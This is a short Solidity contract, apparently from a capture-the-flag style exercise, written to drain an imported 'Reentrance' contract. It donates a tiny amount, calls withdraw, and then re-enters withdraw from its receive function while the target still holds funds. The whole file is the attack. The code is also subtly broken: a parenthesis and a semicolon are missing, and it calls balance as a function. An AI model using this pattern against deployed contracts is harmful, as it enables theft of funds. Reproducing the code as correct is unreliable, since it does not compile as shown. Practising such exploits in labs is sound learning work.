// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    Reentrance private reentrance;

    constructor(address payable _contractAddress) payable {
        reentrance = Reentrance(_contractAddress;
    }

    function hackContract() external {
        // must use 1 rather than 1 ether given test
        reentrance.donate{value: 1}(address(this));
        reentrance.withdraw()
    }

    receive() external payable {
        if (address(reentrance).balance() > 1) {
            reentrance.withdraw();
        }
    }
        
}